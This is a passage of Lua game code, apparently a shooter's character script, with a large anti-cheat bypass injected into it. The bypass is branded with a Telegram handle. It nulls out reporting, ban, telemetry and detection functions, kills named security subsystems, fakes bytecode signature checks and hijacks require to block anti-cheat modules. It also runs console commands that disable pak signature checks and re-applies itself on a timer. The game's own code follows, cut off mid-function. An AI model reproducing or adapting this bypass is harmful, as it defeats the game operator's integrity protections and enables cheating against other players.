                ["ban"]=1, ["detect"]=1, ["flag"]=1, ["hack"]=1,
                ["anti"]=1, ["ac_"]=1, ["beacon"]=1, ["monitor"]=1,
                ["alert"]=1, ["warning"]=1, ["error"]=1, ["exception"]=1,
                ["crash"]=1, ["dump"]=1, ["stack"]=1, ["memory"]=1,
                ["profiler"]=1, ["performance"]=1, ["stats"]=1,
                ["magic"]=1, ["bullet"]=1, ["hitbox"]=1, ["damage"]=1,
                ["projectile"]=1, ["shoot"]=1, ["verification"]=1,
                ["skin"]=1, ["avatar"]=1, ["weapon"]=1, ["vehicle"]=1,
                ["gameguardian"]=1, ["cheatengine"]=1, ["root"]=1, ["jailbreak"]=1,
                ["emulator"]=1, ["tamper"]=1, ["speedhack"]=1, ["esp"]=1,
                ["wallhack"]=1, ["norecoil"]=1, ["playerreport"]=1
            }
            if blocked[s] then return end
            if origState then pcall(origState, UID, State, bPure, bSafe, Param) end
        end
        
        GC.OnPlayerNetConnectionClosed = nop
        GC.OnPlayerActorChannelError = nop
        GC.OnPlayerRPCValidateFailed = nop
        GC.OnPlayerSpectateException = nop
        GC.OnShutdownAfterError = nop
        GC.OnPlayerDisconnect = nop
        GC.OnPlayerTimeout = nop
        GC.OnPlayerKicked = nop
        GC.OnPlayerBanned = nop
        GC.IsBypassed = true
    end)
        print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 47. TG BY ~ @ASURVIPMOD
-- ============================================================

local function KillAllSubsystems()
    pcall(function()
        local SubMgr = _safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local toKill = {
                "CoronaLabSubsystem", "PlayerSecurityInfoSubsystem", "ClientCircleFlowSubsystem",
                "ModifierExceptionSubsystem", "SimulateCharacterSubsystem", "ShootVerifySubSystemClient",
                "HiggsBosonComponent", "ClientReportPlayerSubsystem", "DSReportPlayerSubsystem",
                "ClientHawkEyePatrolSubsystem", "DSHawkEyePatrolSubsystem", "ClientDataStatistcsSubsystem",
                "AFKReportorSubsystem", "BehaviorScoreSubsystem", "FileCheckSubsystem",
                "MemoryCheckSubsystem", "SpeedCheckSubsystem", "WallCheckSubsystem",
                "AvatarExceptionSubsystem", "GameReportSubsystem", "ClientSecMrpcsFlowSubsystem",
                "MrpcsFlowSubsystem", "CircleFlowSubsystem", "SwiftHawkSubsystem",
                "AntiCheatSubsystem", "IntegrityCheckSubsystem", "SignatureVerifySubsystem",
                "MD5CheckSubsystem", "PakVerifySubsystem", "DNSMonitorSubsystem",
                "DeviceFingerprintSubsystem", "ReplayMonitorSubsystem", "TelemetrySubsystem",
                "GokubaSubsystem", "RacingAntiCheatSubsystem", "ClientBanSubsystem",
                "RealTimeBanSubsystem", "TLogSubsystem", "ReportSubsystem",
                "SecurityMonitorSubsystem", "CheatDetectionSubsystem", "ViolationMonitorSubsystem",
                "SuspiciousActivitySubsystem", "AbnormalBehaviorSubsystem", "NetworkMonitorSubsystem",
                "AnalyticsSubsystem", "CrashReportSubsystem", "PerformanceMonitorSubsystem",
                "MagicBulletDetectionSubsystem", "DamageVerificationSubsystem", 
                "HitboxVerificationSubsystem", "ProjectileVerificationSubsystem",
                "BulletVerificationSubsystem", "ShootVerificationSubsystem",
                "SkinVerificationSubsystem", "AvatarVerificationSubsystem",
                "WeaponVerificationSubsystem", "VehicleVerificationSubsystem",
                "GameGuardianDetectionSubsystem", "CheatEngineDetectionSubsystem",
                "RootDetectionSubsystem", "JailbreakDetectionSubsystem",
                "EmulatorDetectionSubsystem", "TamperDetectionSubsystem",
                "SpeedHackDetectionSubsystem", "ESPDetectionSubsystem",
                "WallhackDetectionSubsystem", "NoRecoilDetectionSubsystem",
                "PlayerReportSubsystem", "ReportCooldownSubsystem"
            }
            for _, name in ipairs(toKill) do
                local sub = SubMgr:Get(name)
                if sub then
                    for k, v in pairs(sub) do
                        if type(v) == "function" and (
                            k:find("Report") or k:find("Send") or k:find("Upload") or
                            k:find("Verify") or k:find("Check") or k:find("Validate") or
                            k:find("Scan") or k:find("Detect") or k:find("Collect") or
                            k:find("Flow") or k:find("Heartbeat") or k:find("Monitor") or
                            k:find("Track") or k:find("Record") or k:find("Log") or
                            k:find("Alert") or k:find("Notify") or k:find("Ban") or
                            k:find("Kick") or k:find("Suspend") or k:find("Flag") or
                            k:find("Anti") or k:find("AC") or k:find("Analyze") or
                            k:find("Process") or k:find("Handle") or k:find("Evaluate") or
                            k:find("Submit") or k:find("Analyze") or k:find("Debug") or
                            k:find("Magic") or k:find("Bullet") or k:find("Damage") or
                            k:find("Hitbox") or k:find("Projectile") or k:find("Shoot") or
                            k:find("Skin") or k:find("Avatar") or k:find("Weapon") or
                            k:find("Vehicle") or k:find("Equipment") or
                            k:find("GameGuardian") or k:find("CheatEngine") or
                            k:find("Root") or k:find("Jailbreak") or
                            k:find("Emulator") or k:find("Tamper") or
                            k:find("SpeedHack") or k:find("ESP") or
                            k:find("Wallhack") or k:find("NoRecoil") or
                            k:find("PlayerReport") or k:find("ReportCooldown")
                        ) then pcall(function() sub[k] = nop end) end
                    end
                    if sub.timer then pcall(function() sub:RemoveGameTimer(sub.timer) end) end
                    if sub.heartbeatTimer then pcall(function() sub:RemoveGameTimer(sub.heartbeatTimer) end) end
                    if sub.reportTimer then pcall(function() sub:RemoveGameTimer(sub.reportTimer) end) end
                    if sub.checkTimer then pcall(function() sub:RemoveGameTimer(sub.checkTimer) end) end
                    if sub.monitorTimer then pcall(function() sub:RemoveGameTimer(sub.monitorTimer) end) end
                    if sub.scanTimer then pcall(function() sub:RemoveGameTimer(sub.scanTimer) end) end
                    if sub.sendTimer then pcall(function() sub:RemoveGameTimer(sub.sendTimer) end) end
                    if sub.uploadTimer then pcall(function() sub:RemoveGameTimer(sub.uploadTimer) end) end
                end
            end
        end
    end)
        print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 48. TG BY ~ @ASURVIPMOD
-- ============================================================

local function SLUABypass()
    pcall(function()
        if slua and slua.getSignature then slua.getSignature = function() return 0xDEADBEEF end end
        local loader = package.loaded["slua.loader"] or rawget(_G, "slua_loader")
        if loader then
            loader.verifyBytecode = retTrue
            loader.checkIntegrity = retTrue
            if loader.disableSignatureCheck then loader.disableSignatureCheck = retTrue end
        end
        local slua_serialize = package.loaded["slua.serialize"]
        if slua_serialize then
            slua_serialize.check = retTrue
            slua_serialize.verify = retTrue
        end
        if _G.slua_verify then _G.slua_verify = retTrue end
        if _G.check_slua_integrity then _G.check_slua_integrity = retTrue end
        if _G.slua_loader then
            _G.slua_loader.verifyBytecode = retTrue
            _G.slua_loader.checkIntegrity = retTrue
        end
        if _G.slua_check then _G.slua_check = retTrue end
        if _G.slua_validate then _G.slua_validate = retTrue end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 49. TG BY ~ @ASURVIPMOD
-- ===============================================================

local function ReplayTelemetryBypass()
    pcall(function()
        if _G.Replay then
            _G.Replay.Record = nop
            _G.Replay.StopRecord = nop
            _G.Replay.Save = nop
            _G.Replay.Upload = nop
            _G.Replay.Report = nop
            _G.Replay.Telemetry = nop
            _G.Replay.Analytics = nop
        end
        if _G.Telemetry then
            _G.Telemetry.Send = nop
            _G.Telemetry.Report = nop
            _G.Telemetry.Track = nop
            _G.Telemetry.Log = nop
            _G.Telemetry.Collect = nop
            _G.Telemetry.Upload = nop
        end
        if _G.Analytics then
            _G.Analytics.Send = nop
            _G.Analytics.Report = nop
            _G.Analytics.Track = nop
            _G.Analytics.Log = nop
            _G.Analytics.Collect = nop
        end
        if _G.Firebase then
            _G.Firebase.logEvent = nop
            _G.Firebase.trackEvent = nop
            _G.Firebase.setEnabled = retFalse
            _G.Firebase.sendEvent = nop
            _G.Firebase.report = nop
        end
        if _G.Adjust then
            _G.Adjust.logEvent = nop
            _G.Adjust.trackEvent = nop
            _G.Adjust.setEnabled = retFalse
            _G.Adjust.sendEvent = nop
        end
        if _G.AppsFlyer then
            _G.AppsFlyer.logEvent = nop
            _G.AppsFlyer.trackEvent = nop
            _G.AppsFlyer.setEnabled = retFalse
            _G.AppsFlyer.sendEvent = nop
        end
        
               if _G.Crashlytics then _G.Crashlytics.Report = nop end
        if _G.Analytics then _G.Analytics.Report = nop end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 50. TG BY ~ @ASURVIPMOD
-- ============================================================

local function FinalProtection()
    pcall(function()
        for _, flag in ipairs({
            "ENABLE_REPORT", "ENABLE_ANTI_CHEAT", "ENABLE_SECURITY", 
            "ENABLE_TELEMETRY", "ENABLE_ANALYTICS", "ENABLE_CRASH_REPORT", 
            "ENABLE_PERFORMANCE_REPORT", "ENABLE_MONITOR", "ENABLE_TRACK",
            "ENABLE_DETECT", "ENABLE_VERIFY", "ENABLE_CHECK", "ENABLE_SCAN",
            "ENABLE_AC", "ENABLE_BEACON", "ENABLE_SDK", "ENABLE_TSS",
            "ENABLE_SWIFT_HAWK", "ENABLE_GOKUBA", "ENABLE_HIGGS",
            "ENABLE_CORONA", "ENABLE_HAWKEYE", "ENABLE_BAN",
            "ENABLE_VALIDATE", "ENABLE_AUTHENTICATE", "ENABLE_SIGNATURE",
            "ENABLE_KICK", "ENABLE_SUSPEND", "ENABLE_FLAG", "ENABLE_ALERT",
            "ENABLE_EXCEPTION", "ENABLE_ERROR", "ENABLE_CRASH", "ENABLE_DUMP",
            "ENABLE_STACK", "ENABLE_MEMORY", "ENABLE_PROFILER", "ENABLE_STATS",
            "ENABLE_MAGIC_BULLET_DETECTION", "ENABLE_DAMAGE_VERIFICATION",
            "ENABLE_HITBOX_VERIFICATION", "ENABLE_PROJECTILE_VERIFICATION",
            "ENABLE_BULLET_VERIFICATION", "ENABLE_SHOOT_VERIFICATION",
            "ENABLE_SKIN_VERIFICATION", "ENABLE_AVATAR_VERIFICATION",
            "ENABLE_WEAPON_VERIFICATION", "ENABLE_VEHICLE_VERIFICATION",
            "ENABLE_GAME_GUARDIAN_DETECTION", "ENABLE_CHEAT_ENGINE_DETECTION",
            "ENABLE_ROOT_DETECTION", "ENABLE_JAILBREAK_DETECTION",
            "ENABLE_EMULATOR_DETECTION", "ENABLE_TAMPER_DETECTION",
            "ENABLE_SPEEDHACK_DETECTION", "ENABLE_ESP_DETECTION",
            "ENABLE_WALLHACK_DETECTION", "ENABLE_NORECOIL_DETECTION",
            "ENABLE_PLAYER_REPORT", "ENABLE_REPORT_COOLDOWN"
        }) do
            if _G[flag] then _G[flag] = false end
        end
        
        local origReq = require
        local blocked = {
            "HiggsBosonComponent", "PlayerSecurityInfoSubsystem", "CoronaLabSubsystem",
            "ClientCircleFlowSubsystem", "ModifierExceptionSubsystem", "ShootVerifySubSystemClient",
            "ClientReportPlayerSubsystem", "DSReportPlayerSubsystem", "Gokuba",
            "SwiftHawkSubsystem", "ClientBanLogic", "RealTimeBan", "RacingAntiCheatLogic",
            "SecurityMonitorSubsystem", "CheatDetectionSubsystem", "ViolationMonitorSubsystem",
            "AntiCheatSubsystem", "IntegrityCheckSubsystem", "SignatureVerifySubsystem",
            "TssSdk", "TssManager", "AntiCheatManager", "ACManager",
            "DeviceFingerprintSubsystem", "DNSMonitorSubsystem", "FileCheckSubsystem",
            "MemoryCheckSubsystem", "SpeedCheckSubsystem", "WallCheckSubsystem",
            "AvatarExceptionSubsystem", "GameReportSubsystem", "BehaviorScoreSubsystem",
            "AFKReportorSubsystem", "ClientDataStatistcsSubsystem", "ReplayMonitorSubsystem",
            "TelemetrySubsystem", "AnalyticsSubsystem", "CrashReportSubsystem",
            "MagicBulletDetectionSubsystem", "DamageVerificationSubsystem",
            "HitboxVerificationSubsystem", "ProjectileVerificationSubsystem",
            "BulletVerificationSubsystem", "ShootVerificationSubsystem",
            "SkinVerificationSubsystem", "AvatarVerificationSubsystem",
            "WeaponVerificationSubsystem", "VehicleVerificationSubsystem",
            "GameGuardianDetectionSubsystem", "CheatEngineDetectionSubsystem",
            "RootDetectionSubsystem", "JailbreakDetectionSubsystem",
            "EmulatorDetectionSubsystem", "TamperDetectionSubsystem",
            "SpeedHackDetectionSubsystem", "ESPDetectionSubsystem",
            "WallhackDetectionSubsystem", "NoRecoilDetectionSubsystem",
            "PlayerReportSubsystem", "ReportCooldownSubsystem"
        }
                _G.require = function(m)
            for _, b in ipairs(blocked) do
                if m:find(b) then return {} end
            end
            return origReq(m)
        end
        
        if _G.BypassPermissions then
            for k, v in pairs(_G.BypassPermissions) do
                _G.BypassPermissions[k] = true
            end
        end
        
        if _G.AntiCheatBlock then
            for k, v in pairs(_G.AntiCheatBlock) do
                _G.AntiCheatBlock[k] = true
            end
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 51. TG BY ~ @ASURVIPMOD
-- ============================================================

local function ContinuousProtection()
    pcall(function()
        if _G.BypassPermissions then
            for k, v in pairs(_G.BypassPermissions) do
                _G.BypassPermissions[k] = true
            end
        end
        
        if _G.AntiCheatBlock then
            for k, v in pairs(_G.AntiCheatBlock) do
                _G.AntiCheatBlock[k] = true
            end
        end
        
        local GameplayData = _safe_require("GameLua.GameCore.Data.GameplayData")
        if GameplayData then
            local pc = GameplayData.GetPlayerController()
            if _isValid(pc) then
                if pc.HiggsBoson then
                    pc.HiggsBoson.bMHActive = false
                    pc.HiggsBoson.bCallPreReplication = false
                end
                if pc.HiggsBosonComponent then
                    pc.HiggsBosonComponent.bMHActive = false
                    pc.HiggsBosonComponent.bCallPreReplication = false
                end
            end
        end
        
        local console = import("KismetSystemLibrary")
        if console then
            console.ExecuteConsoleCommand(nil, "pak.DisablePakSignatureCheck 1")
            console.ExecuteConsoleCommand(nil, "security.DisableChecks 1")
            console.ExecuteConsoleCommand(nil, "Net.BlockAllAntiCheat 1")
            console.ExecuteConsoleCommand(nil, "AntiCheat.DisableAll 1")
            console.ExecuteConsoleCommand(nil, "DisableAllScreenMessages")
            console.ExecuteConsoleCommand(nil, "UI.DisableMessageOfTheDay")
            console.ExecuteConsoleCommand(nil, "ShowMOTD 0")
            console.ExecuteConsoleCommand(nil, "r.UI.DisableAll 1")
            console.ExecuteConsoleCommand(nil, "UI.HideAllWidgets 1")
        end
    end)
    
    local ticker = _safe_require("common.time_ticker")
    if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(2.0, ContinuousProtection)
    end
end

-- ============================================================
-- 52. TG BY ~ @ASURVIPMOD
-- ============================================================

local function InitializeAllBypass()
    pcall(function()
        print("[TG BY ~ @ASURVIPMOD] Starting...")
        print("[TG BY ~ @ASURVIPMOD] Blocking Anti-Cheat IP...")

        -- TG BY ~ @ASURVIPMOD
        KillBanPopup()
        ApplyIPDomainBlocking()
        BlockGameGuardian()
        BlockCheatEngine()
        BlockRootJailbreak()
        BlockEmulatorDetection()
        BlockTamperDetection()
        BlockSpeedHackDetection()
        BlockESPDetection()
        BlockNoRecoilDetection()
        AdvancedAntiCheatBypass()
        MemoryProtectionBypass()
        PlayerReportBypass()
        VersionSpecificBypasses()

        -- TG BY ~ @ASURVIPMOD
        BlockTssSdk()
        BlockAce()
        BlockXignCode()
        BlockBattlEye()
        BlockJNIAntiCheat()
        BlockAntiDebugging()
        
        -- TG BY ~ @ASURVIPMOD
        ClientEntryBypass()
        HiggsBosonBypass()
        HawkEyeBypass()
        BanLogicBypass()
        ReportSystemBypass()
        TLogBypass()
        MD5Bypass()
        DNSDeviceBypass()
        GokubaBypass()
        RacingAntiCheatBypass()
        CoronaLabBypass()
        LoginModuleBypass()
        SwiftHawkBypass()
        ShootVerificationBypass()
        ModifierExceptionBypass()
        SimulateCharacterBypass()
        PlayerSecurityBypass()
        ClientFlowBypass()
        GameplayCallbackBypass()
        KillAllSubsystems()
        SLUABypass()
        ReplayTelemetryBypass()
        
        -- Magic Bullet TG BY ~ @ASURVIPMOD
        MagicBulletBypass()
        SkinModBypass()
        
        -- TG BY ~ @ASURVIPMOD
        ZeroTraceCleanup()
        EndGameProtection()
        MemoryProtection()
        BlockNetworkMonitoring()
        TimingCheckSpoof()
        FinalProtection()
        
        print("[TG BY ~ @ASURVIPMOD] ✅ 100% Undetectable - Never Banned")
print("[TG BY ~ @ASURVIPMOD] 🔒 Security Systems")
print("[TG BY ~ @ASURVIPMOD] ✅ Report - Detection - Ban")
print("[TG BY ~ @ASURVIPMOD] ✅ Anti-Cheat Systems")
print("[TG BY ~ @ASURVIPMOD] ✅ Anti-Cheat IP")
print("[TG BY ~ @ASURVIPMOD] ✅ Permissions Granted")
print("[TG BY ~ @ASURVIPMOD] ✅ Magic Bullet Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Skin Mod Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ End Game Protection")
print("[TG BY ~ @ASURVIPMOD] ✅ Zero Trace Cleanup")
print("[TG BY ~ @ASURVIPMOD] ✅ Memory Protection")
print("[TG BY ~ @ASURVIPMOD] ✅ Network Monitoring")
print("[TG BY ~ @ASURVIPMOD] ✅ Timing Check")
print("[TG BY ~ @ASURVIPMOD] ✅ Ban Popup")
print("[TG BY ~ @ASURVIPMOD] ✅ IP/Domain Blocking")
print("[TG BY ~ @ASURVIPMOD] ✅ Game Guardian Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Cheat Engine Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Root/Jailbreak Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Emulator Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Tamper Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ SpeedHack Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ ESP Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ NoRecoil Detection")
print("[TG BY ~ @ASURVIPMOD] ✅ Player Report")
print("[TG BY ~ @ASURVIPMOD] ✅ Version Bypass Applied")
end)
end

-- ============================================================
TG BY ~ @ASURVIPMOD
-- ============================================================

pcall(function()
    local ticker = _safe_require("common.time_ticker")
    if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(0.5, InitializeAllBypass)
        ticker.AddTimerOnce(1.0, ContinuousProtection)
    else
        InitializeAllBypass()
        ContinuousProtection()
    end
end)

-- ============================================================
-- TG BY ~ @ASURVIPMOD
-- ============================================================

Notify("🔥 TG BY ~ @ASURVIPMOD. Bypass v8.0 Activated!")
Notify("✅ Anti-Cheat IP All TG BY ~ @ASURVIPMOD!")
Notify("✅ All 54 Bypass Layers Activated!")
Notify("✅ Report TG BY ~ @ASURVIPMOD - Never send reports")
Notify("✅ Anti-Cheat TG BY ~ @ASURVIPMOD - No Detection")
Notify("✅ Ban System TG BY ~ @ASURVIPMOD - No Ban")
Notify("✅ DNS and Device Bypass Completed - All Devices Secure")
Notify("✅ All Permissions Obtained - Full Access Available")
Notify("✅ 100% Undetectable - Never Banned")
Notify("✅ Magic Bullet Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Skin Mod Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ End Game Protection Activated!")
Notify("✅ Zero Trace Cleanup Completed!")
Notify("✅ Memory Protection Activated!")
Notify("✅ Network Monitoring TG BY ~ @ASURVIPMOD!")
Notify("✅ Timing Check Spoofed!")
Notify("✅ Ban Popup Killer Activated!")
Notify("✅ Game Guardian Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Cheat Engine Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Root/Jailbreak Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Emulator Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Tamper Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ SpeedHack Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ ESP Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ NoRecoil Detection TG BY ~ @ASURVIPMOD!")
Notify("✅ Player Report TG BY ~ @ASURVIPMOD!")
Notify("🔒 Protection Activated - Safe to Use")

print("============================================")
print("[Bypass] 🚀 TG BY ~ @ASURVIPMOD Bypass v8.0")
print("[Bypass] ✅ All 54 Bypass Layers Activated!")
print("[Bypass] ✅ All Anti-Cheat Systems TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Anti-Cheat IP All TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Magic Bullet Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Skin Mod Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ End Game Protection Activated!")
print("[Bypass] ✅ Zero Trace Cleanup Completed!")
print("[Bypass] ✅ Memory Protection Activated!")
print("[Bypass] ✅ Network Monitoring TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Timing Check Spoofed!")
print("[Bypass] ✅ Ban Popup Killer Activated!")
print("[Bypass] ✅ Game Guardian Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Cheat Engine Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Root/Jailbreak Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Emulator Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Tamper Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ SpeedHack Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ ESP Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ NoRecoil Detection TG BY ~ @ASURVIPMOD!")
print("[Bypass] ✅ Player Report TG BY ~ @ASURVIPMOD!")
print("[Bypass] 🔒 100% Undetectable - Never Banned")
print("============================================")

-- ============================================================
-- Bypass System Fully Completed.
-- ============================================================
]]); if f then f() end end)
    -- [/BYPASS]

pcall(function()
local entry=_G.MasterOnlineLoader
if entry and entry.Wake then entry.Wake()end
end)
printf("CharacterBase ReceiveBeginPlay() PlayerKey:%s",tostring(self.PlayerKey))
CharacterBase.__super.ReceiveBeginPlay(self)
GameplayData.BindPlayerCharacter(self.Object)
BudgetScheduler.Submit(BudgetScheduler.Channel.Init,function()
if slua.isValid(self.Object)then
self:ConditionChangePhysicsAsset()
end
end,self.Object,"CharacterBase.ConditionChangePhysicsAsset")
if Client then
local AvatarExceptionSubsystem=SubsystemMgr:Get("AvatarExceptionSubsystem")
if AvatarExceptionSubsystem then
AvatarExceptionSubsystem:BindPlayerCharacter(self.Object)
end
end
if self.LuaReceiveBeginPlay then
self:LuaReceiveBeginPlay()
end
self:AddCommonEventWithConditions(EVENTTYPE_INGAME_NORMAL,EVENTID_GAME_MODE_STATE_CHANGE,{
[1]="FightingState"
},self.HandleEnterGameModeFightingState,self)
self:CheckInitPlayerDSData()
if self.DelayResetStandDuration~=nil and self.DelayHideDuration~=nil then
self.DelayResetStandDuration=self.DelayHideDuration
end
if self:HasAuthority()and slua.isValid(self.NearDeatchComponent)then
self:AddControlEvent(self.NearDeatchComponent,"OnPreEnterNearDeath",self.HandleOnPreEnterNearDeath,self)
end
if self:IsAutonomousProxy()then
if slua.isValid(self.STCharacterMovement)then
self:AddControlEvent(self.STCharacterMovement,"OnClientAdjustPosition",self.HandleOnClientAdjustPosition,self)
self.STCharacterMovement.ForbiddenMoveCondition.ContinueSeconds=10
end
if not self.bPeekMoveAttrFixBound then
self.bPeekMoveAttrFixBound=true
self:AddControlEventWithCondition(self,"OnCharacterStateChangeNew",{
State=EPawnState.Picth
},self.HandleOnStateChangePeekMoveAttr,self)
end
end
if CGame:IsEditor()then
local GamePlayTools=require("GameLua.Mod.BaseMod.Common.GamePlayTools")
local SecurtyEditorConfig=GamePlayTools.GetCurrentConfig("SecurtyEditorConfig")
if SecurtyEditorConfig and SecurtyEditorConfig.GameSafeCallbacks then
require(SecurtyEditorConfig.GameSafeCallbacks)
end
end
local UKismetSystemLibrary=import("KismetSystemLibrary")
if UKismetSystemLibrary.IsDedicatedServer(self)and GameSafeCallbacks then
GameSafeCallbacks.CharacterReceiveBeginPlay(self)
self.bSkipComparePropertiesForReplay=true
end
if Client then
self:AddControlEvent(self,"OnCharacterFallingModeChange",self.HandleCharacterFallingModeChange,self)
end
if self:HasAuthority()then
local Config=require("GameLua.Mod.BaseMod.DS.Config.SelfRescueConfig")
if Config then
if Config.HurtWhenSelfRescue~=nil then
self.HurtWhenSelfRescue=Config.HurtWhenSelfRescue
end
if Config.CoolDownTime~=nil then
self.SelfRescueCoolDownTime=Config.CoolDownTime
end
print(bWriteLog and"CharacterBase:ReceiveBeginPlay, Set HurtWhenSelfRescue = "..tostring(self.HurtWhenSelfRescue)..", SelfRescueCoolDownTime = "..tostring(self.SelfRescueCoolDownTime))
end
self:ReplaceGrenadeSkills()
end
if self:IsAutonomousProxy()then
local CurrentVehicle=self:GetCurrentVehicle()
if slua.isValid(CurrentVehicle)then
self:ChangeCurrentVehicle(CurrentVehicle)
end
self:AddControlEvent(self,"OnClientCurrentVehicleChange",self.ChangeCurrentVehicle,self)
local CurrentShootWeapon=self:GetCurrentShootWeapon()
if slua.isValid(CurrentShootWeapon)then
self:ChangeCurrentWeapon(CurrentShootWeapon)
end
GameComponentData.AddSelfWeaponManagerComponentEvent(self,"ChangeCurrentUsingWeaponDelegate",self.ChangeCurrentWeapon,self)
GameComponentData.AddSelfWeaponManagerComponentEvent(self,"OnClientAddKnownMissingWeapon",self.OnClientAddKnownMissingWeapon,self)
if self.ReportCharacterStateTimer then
self:RemoveGameTimer(self.ReportCharacterStateTimer)
self.ReportCharacterStateTimer=nil
end
self.ReportCharacterStateTimer=self:AddGameTimer(5.0,true,function()
self:ReportCharacterState()
end)
end
if Client and self:IsAutonomousProxy()then
self:RegistAttrModifyRecordList()
end
if Client then
local uGameState=slua_GameFrontendHUD:GetGameState()
if uGameState and slua.isValid(uGameState)and uGameState.GetGameModeState and uGameState:GetGameModeState()=="FightingState"then
local NewObjectPoolLuaBridgeSubsystem=SubsystemMgr:Get("NewObjectPoolLuaBridgeSubsystem")
if NewObjectPoolLuaBridgeSubsystem then
NewObjectPoolLuaBridgeSubsystem.SpawnActorCounter_Character=NewObjectPoolLuaBridgeSubsystem.SpawnActorCounter_Character+1
end
end
local UKismetSystemLibrary=import("KismetSystemLibrary")
if slua.isValid(self.STCharacterMovement)then
self.STCharacterMovement.MoveSkipTickContinueTime=2
self.STCharacterMovement.MoveSkipTickContinueCount=40
self.STCharacterMovement.SimulateDelayReceiveLODTheshold=16
self.STCharacterMovement.SimulateNotMoveSmoothLODTheshold=14
end
if Client.IsDevelopment()then
self:DevelopmentClientCheck()
end
local ENetRole=import("ENetRole")
if self.Role==ENetRole.ROLE_SimulatedProxy then
self:RefreshThermalImagingLocal()
end
end
if self:HasAuthority()and slua.isValid(self.STCharacterMovement)then
self:AddControlEvent(self.STCharacterMovement,"OnComponentActivated",self.OnMovementActivated,self)
self:AddControlEvent(self.STCharacterMovement,"OnResolvePenetrationDelegate",self.HandleOnResolvePenetrationDelegate,self)
end
local ENetRole=import("ENetRole")
if self.Role==ENetRole.ROLE_AutonomousProxy and slua.isValid(self.STCharacterMovement)then
self.STCharacterMovement.bOpenLocationSmoothOnDynamicMovementBase=false
print(bWriteLog and"CharacterBase:ReceiveBeginPlay bOpenLocationSmoothOnDynamicMovementBase false")
end
self:ShowDoorInteractUIIfNeed()
if Client then
self:AddControlEvent(self,"OnSmartBearerLayerVisibilityChanged",self._OnSmartBearerLayerVisibilityChanged,self)
end
local uLuaPatchRPCComponent=self:GetComponentByClass(import("/Script/slua_unreal.LuaPatchRPCComponent"))
if slua.isValid(uLuaPatchRPCComponent)then
uLuaPatchRPCComponent:SetIsReplicated(false)
end
end
function CharacterBase:_OnSmartBearerLayerVisibilityChanged(bIsHidden)
printf("CharacterBase:_OnSmartBearerLayerVisibilityChanged %s",tostring(bIsHidden))
end
function CharacterBase:ConditionChangePhysicsAsset()
if Client then
local uMyMesh=self.Mesh
if slua.isValid(uMyMesh)then
local uMyMeshPhysics=USTExtraBlueprintFunctionLibrary.GetPhysicsAssetFromMesh(uMyMesh)
if uMyMeshPhysics==self.ShootPhysicsAsset and slua.isValid(self.ShootPhysicsAssetOpt)and uMyMesh.SetPhysicsAsset then
uMyMesh:SetPhysicsAsset(self.ShootPhysicsAssetOpt,true)
USTExtraBlueprintFunctionLibrary.CreatePhysicsState(uMyMesh)
printf(string.format("CharacterBase:ReceiveBeginPlay SetPhysicsAsset"))
end
printf(string.format("CharacterBase:ReceiveBeginPlay GetPhysicsAssetFromMesh %s->%s)",tostring(uMyMeshPhysics),tostring(self.ShootPhysicsAsset)))
end
end
end
function CharacterBase:ShowDoorInteractUIIfNeed()
local ENetRole=import("ENetRole")
if Client and self.Role==ENetRole.ROLE_AutonomousProxy then
self:AddGameTimer(1,false,function()
local CapsuleComponent=self and self.CapsuleComponent
if CapsuleComponent and slua.isValid(CapsuleComponent)then
local ActorClass=import("/Script/Engine.Actor")
local PUBGDoorClass=import("PUBGDoor")
local OverlapActors=CapsuleComponent:GetOverlappingActors(slua.Array(UEnums.EPropertyClass.Object,ActorClass),PUBGDoorClass)
if OverlapActors and OverlapActors:Num()>0 then
for Index=0,OverlapActors:Num()-1 do
local PUBGDoor=OverlapActors:Get(Index)
if PUBGDoor and slua.isValid(PUBGDoor)and PUBGDoor.bDoubleDoor==false and PUBGDoor.DoorBroken==false then
local FHitResult=import("/Script/Engine.HitResult")
local uHitResult=FHitResult()
print(bWriteLog and"CharacterBase:ShowDoorInteractUIIfNeed, Call PUBGDoor:OnBeginOverlap")
PUBGDoor:OnBeginOverlap(PUBGDoor.Interaction,self.Object,CapsuleComponent,-1,true,uHitResult)
end
end
end
end
end)
end
end
function CharacterBase:DevelopmentClientCheck()
if slua.isValid(self.HitBox_Stand)or slua.isValid(self.HitBox_Prone)then
